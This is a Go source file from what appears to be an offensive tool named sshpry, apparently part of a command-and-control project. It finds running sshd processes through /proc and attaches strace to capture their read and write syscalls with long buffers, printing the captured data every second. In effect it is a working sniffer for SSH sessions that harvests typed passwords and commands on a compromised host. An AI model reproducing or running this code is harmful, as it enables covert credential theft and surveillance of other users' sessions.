package pry

import (
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/PatronC2/sshpry-go/strace"
)

var activeProcesses = make(map[int]bool)
var mu sync.Mutex

func GetSSHProcesses() ([]int, error) {
	var sshPids []int

	entries, err := os.ReadDir("/proc")
	if err != nil {
		return nil, err
	}

	for _, entry := range entries {
		if entry.IsDir() {
			pid, err := strconv.Atoi(entry.Name())
			if err != nil {
				continue
			}

			cmdlinePath := fmt.Sprintf("/proc/%d/cmdline", pid)
			cmdline, err := os.ReadFile(cmdlinePath)
			if err != nil {
				continue
			}

			if strings.Contains(string(cmdline), "sshd") {
				sshPids = append(sshPids, pid)
			}
		}
	}

	return sshPids, nil
}

func StartTracing(pid int) {
	mu.Lock()
	if activeProcesses[pid] {
		mu.Unlock()
		return
	}
	activeProcesses[pid] = true
	mu.Unlock()

	fmt.Printf("Starting trace on SSH process: %d\n", pid)

	s := strace.STrace{
		Flags: map[string]string{
			"-s": "16384",
			"-p": strconv.Itoa(pid),
			"-e": "read,write",
		},
	}

	err := s.Trace()
	if err != nil {
		log.Printf("Failed to start trace on PID %d: %v", pid, err)
		return
	}

	go func() {
		for {
			fmt.Printf("[PID %d] Err: %s\n", pid, s.Stderr.String())
			fmt.Printf("[PID %d] Out: %s\n", pid, s.Stdout.String())

			s.Stderr.Reset()
			s.Stdout.Reset()

			time.Sleep(1 * time.Second)
		}
	}()
}
